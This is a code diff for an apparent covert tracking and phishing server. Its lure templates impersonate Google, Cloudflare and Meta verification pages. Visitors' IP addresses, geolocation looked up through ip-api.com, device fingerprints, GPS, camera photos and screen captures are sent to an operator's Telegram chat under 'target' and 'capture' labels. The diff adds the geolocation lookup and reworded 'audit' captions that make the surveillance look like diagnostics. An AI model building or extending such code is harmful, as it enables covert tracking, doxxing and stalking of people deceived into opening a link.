@@ -198,24 +198,40 @@ async function startServer() {
 
     if (botInstance) {
       const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+      const targetIp = String(ip).split(',')[0].trim();
       
-      let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
-                `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
-                `🌐 <b>IP ADDRESS:</b> <code>${escapeHTML(String(ip))}</code>\n` +
-                `📦 <b>TEMPLATE:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
-                `🔑 <b>TARGET ID:</b> <code>${id}</code>\n\n` +
-                `🖥️ <b>BROWSER AGENT:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
-                `━━━━━━━━━━━━━━━━━━━━\n` +
-                `⏳ <i>STATUS: PROCESSING SECURITY AUDIT...</i>`;
+      (async () => {
+        let geoInfo = "<i>Fetching Geodata...</i>";
+        try {
+          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,city,isp,as,mobile,proxy,query`).then(r => r.json());
+          if (res.status === 'success') {
+            geoInfo = `├ COUNTRY: <code>${res.country}</code>\n` +
+                      `├ CITY: <code>${res.city}</code>\n` +
+                      `├ ISP: <code>${res.isp}</code>\n` +
+                      `├ VPN/PROXY: <code>${res.proxy ? 'YES' : 'CLEAN'}</code>\n` +
+                      `└ MOBILE: <code>${res.mobile ? 'YES' : 'NO'}</code>`;
+          }
+        } catch(e) {}
 
-      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
+        let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                  `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
+                  `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n\n` +
+                  `🌍 <b>GEOGRAPHIC OSINT:</b>\n${geoInfo}\n\n` +
+                  `📦 <b>TEMPLATE:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
+                  `🔑 <b>NODE_ID:</b> <code>${id}</code>\n\n` +
+                  `🖥️ <b>BROWSER AGENT:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `⏳ <i>STATUS: INITIALIZING ADVANCED AUDIT...</i>`;
+
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
+      })();
       
       targetsData.push({
         id: id,
         timestamp: new Date().toISOString(),
         type: 'BASIC_HIT',
-        ip: String(ip),
+        ip: targetIp,
         ua: String(userAgent)
       });
       saveTargets();
@@ -240,40 +256,40 @@ async function startServer() {
       const tmplId = data.tmplId || '1';
       const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
       
-      let header = '🕵️‍♂️ <b>Security Audit: Metadata Captured</b>';
-      let statusText = '🔄 <i>PROCESSING...</i>';
+      let header = '🕵️‍♂️ <b>SYSTEM DIAGNOSTIC: Metadata Captured</b>';
+      let statusText = '🔄 <i>SYNCING...</i>';
 
       if (tmplId === 'google') {
-        header = '🛡️ <b>GOOGLE SECURITY REPORT</b>';
+        header = '🛡️ <b>GOOGLE SECURITY AUDIT</b>';
       } else if (tmplId === 'cloudflare') {
-        header = '☁️ <b>CLOUDFLARE EDGE LOG</b>';
+        header = '☁️ <b>CLOUDFLARE EDGE REPORT</b>';
       } else if (tmplId === 'meta_verification') {
-        header = '🎯 <b>META VERIFICATION AUDIT</b>';
-      } else if (tmplId === 'pegasus') {
-        header = '⚡ <b>PEGASUS SYSTEM TRACE</b>';
+        header = '🎯 <b>META VERIFICATION SESSION</b>';
+      } else if (tmplId === 'terminal') {
+        header = '💻 <b>KERNEL DIAGNOSTIC LOG</b>';
       } else if (tmplId === 'gallery') {
-        header = '🖼️ <b>MEDIA FORENSIC REPORT</b>';
+        header = '🖼️ <b>MEDIA INTEGRITY REPORT</b>';
       }
       
-      if (data.visual_identity) statusText = '📸 <i>IMAGE CAPTURED</i>';
-      if (data.gps) statusText = '📍 <i>LOCATION SYNCED</i>';
+      if (data.visual_identity) statusText = '📸 <i>MEDIA_CAPTURE_ACTIVE</i>';
+      if (data.gps) statusText = '📍 <i>GPS_FIX_ESTABLISHED</i>';
 
       let msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                  `📋 <b>OPERATION DETAILS:</b>\n` +
-                  `├ NAME: <code>${escapeHTML(templateName)}</code>\n` +
-                  `├ STATUS: <code>${statusText}</code>\n` +
-                  `└ ID: <code>${id}</code>\n\n` +
-                  `🖥️ <b>SYSTEM PROFILE:</b>\n` +
-                  `├ PLATFORM: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
-                  `├ BROWSER: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
-                  `├ CPU: <code>${escapeHTML(String(data.cores || 'N/A'))} CORES</code>\n` +
-                  `├ RAM: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
-                  `├ GPU: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
-                  `└ SCREEN: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
-                  `🌍 <b>LOCALIZATION:</b>\n` +
+                  `📋 <b>SESSION INFRASTRUCTURE:</b>\n` +
+                  `├ CONTEXT: <code>${escapeHTML(templateName)}</code>\n` +
+                  `├ STATE: <code>${statusText}</code>\n` +
+                  `└ NODE_ID: <code>${id}</code>\n\n` +
+                  `🖥️ <b>DEVICE FINGERPRINT:</b>\n` +
+                  `├ OS/PLAT: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                  `├ ENGINE: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
+                  `├ CPU_CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
+                  `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
+                  `└ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
+                  `🌍 <b>GEOGRAPHIC DATA:</b>\n` +
                   `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
-                  `└ LANGS: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
+                  `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
@@ -298,14 +314,14 @@ async function startServer() {
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
       const data = req.body as any;
-      let extraMsg = `📎 <b>Security Audit: Advanced Modules</b>\n` +
+      let extraMsg = `📎 <b>FORENSIC LOG: Advanced Modules</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
       let hasTextData = false;
       
       const addSection = (title: string, content: string) => {
         if (extraMsg.length + content.length > 3900) {
-            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Content continues...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
-            extraMsg = `📎 <b>Continued Audit Logs</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
+            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Continuing audit stream...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
+            extraMsg = `📎 <b>CONTINUED AUDIT STREAM</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
         }
         extraMsg += `<b>${title}</b>\n${content}\n\n`;
         hasTextData = true;
@@ -318,7 +334,7 @@ async function startServer() {
           const buffer = Buffer.from(base64Data, 'base64');
           if (buffer.length > 0) {
             botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'media.jpg' }, { 
-              caption: '📸 <b>Identity Capture: Media</b>\nTarget ID: <code>' + id + '</code>', 
+              caption: '📸 <b>CAPTURE: Media Identity</b>\nTarget: <code>' + id + '</code>', 
               parse_mode: 'HTML' 
             }).catch(err => console.error('Error sending media photo:', err));
           }
@@ -332,11 +348,17 @@ async function startServer() {
           const buffer = Buffer.from(base64Data, 'base64');
           if (buffer.length > 0) {
             botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'screen.jpg' }, { 
-              caption: '🖥️ <b>Identity Capture: Screen</b>\nLabel: <code>' + (data.screen_label || 'Default') + '</code>', 
+              caption: '🖥️ <b>CAPTURE: Remote Screen</b>\nLabel: <code>' + (data.screen_label || 'Active Session') + '</code>', 
               parse_mode: 'HTML' 
             }).catch(err => console.error('Error sending screen photo:', err));
           }
         } catch(e) { console.error('Buffer processing error (screen_capture):', e); }
+      }
+
+      if (data.display_hz || data.thermal_load) {
+        addSection(`📡 Display & Thermal`,
+                   `├ Refresh: <code>${data.display_hz || 'N/A'} Hz</code>\n` +
+                   `└ Thermal: <code>${data.thermal_load || 'Stable'}</code>`);
       }
 
       if (data.hardware_brand_profile) {
